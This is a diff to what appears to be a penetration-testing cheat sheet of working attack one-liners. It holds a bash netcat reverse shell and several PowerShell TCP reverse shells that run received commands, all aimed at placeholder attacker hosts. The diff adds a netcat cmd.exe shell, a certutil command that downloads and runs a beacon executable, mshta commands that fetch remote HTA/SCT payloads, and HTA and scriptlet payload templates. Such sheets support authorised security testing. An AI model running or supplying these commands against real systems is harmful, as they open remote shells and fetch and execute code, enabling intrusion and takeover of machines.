@@ -34,7 +34,7 @@ out.println(disr); disr = dis.readLine();
 ## BASH REVERSE SHELL
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 -------------------------------------------------------------------------------------------------------------------------------------------------------------
-## POWERSHELL REVERSE SHELLS
+## POWERSHELL REVERSE SHELLS (https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/)
 1) $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 2) powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 3) powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
@@ -42,3 +42,33 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------
 ## WINDOWS NETCAT: nc.exe -e cmd.exe <Attacker_IP> <PORT>
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+## WINDOWS CERTUTIL: certutil.exe -urlcache -split -f http://127.0.0.1:4444/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+## WINDOWS MSHTA:
+1) mshta.exe vbscript:Close(Execute("GetObject(""script:http://127.0.0.1:4444/payload.sct"")"))
+2) mshta.exe http://127.0.0.1:4444/payload.hta
+3) mshta.exe \\127.0.0.1\folder\payload.hta
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+## WINDOWS SCT PAYLOAD:
+<html>
+  <head>
+    <HTA:APPLICATION ID="HelloExample">
+    <script language="jscript">
+      new ActiveXObject('WScript.Shell').Run("cmd.exe /c calc.exe");
+    </script>
+  </head>
+  <body>
+    <script>self.close();</script>
+  </body>
+</html>
+
+<?XML version="1.0"?>
+<scriptlet>
+  <public>
+  </public>
+  <script language="JScript">
+    <![CDATA[var r = new ActiveXObject("WScript.Shell").Run("calc.exe");]]>
+  </script>
+</scriptlet>
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
